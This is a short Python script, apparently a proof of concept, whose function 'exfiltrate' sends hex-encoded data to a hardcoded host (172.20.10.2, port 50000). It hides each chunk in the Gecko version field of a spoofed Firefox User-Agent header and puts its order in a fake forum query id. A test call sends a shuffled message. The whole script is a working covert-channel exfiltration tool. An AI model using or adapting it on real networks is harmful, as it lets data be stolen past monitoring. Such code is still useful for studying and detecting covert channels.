import http.client

# HTTP headers (inspired by some website with example of use, might get syntax error if uncommented)
"""headers_example = {’User-Agent’: "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:63.0) Gecko/%s Firefox/63.0" % gecko,
           ’Accept’: "application/json",
           ’accept-encoding’: "gzip, deflate",
           ’accept-language’: "fr,fr-FR;q=0.8,en-US;q=0.5,en;q=0.3",
           ’connection’: "keep-alive"
           ’Content-Type’: "application/json"}"""

def exfiltrate(message):
    conn = http.client.HTTPConnection("172.20.10.2", 50000)
    for item in message:
        get_request(item[0], item[1], conn)
    conn.close()
    return

def get_request(pos, hex, conn):
    gecko = hex
    id = pos
    # As only user-agent is of interest for now :
    headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:63.0) Gecko/%s Firefox/63.0" % gecko}
    conn.request("GET", "/forum?id=%s" % (id), headers=headers) # can also query "/forum?id=%s&page=%s" % (id, page)" default page is 1
    res = conn.getresponse()
    print(res.status, res.reason)
    data = res.read()
    print(data)
    return

### test example ###
test = [(3, '6672'), (1, '6c6c'), (4, '6f6d'), (2, '6f20'), (5, '206d'), (0, '6865'), (6, '6172'), (7, '73xx')]
exfiltrate(test)
